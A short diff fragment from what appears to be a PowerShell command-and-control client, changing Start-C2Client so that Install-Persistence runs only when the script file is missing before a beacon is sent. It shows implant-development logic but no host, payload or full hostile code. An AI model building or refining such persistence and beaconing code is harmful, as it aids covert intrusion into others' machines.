@@ -82,7 +82,9 @@ function Install-Persistence {
 }
 
 function Start-C2Client {
-    Install-Persistence
+    if (-not (Test-Path $scriptPath)) {
+        Install-Persistence
+    }
     
     Send-Beacon -data @{
         type = "init"
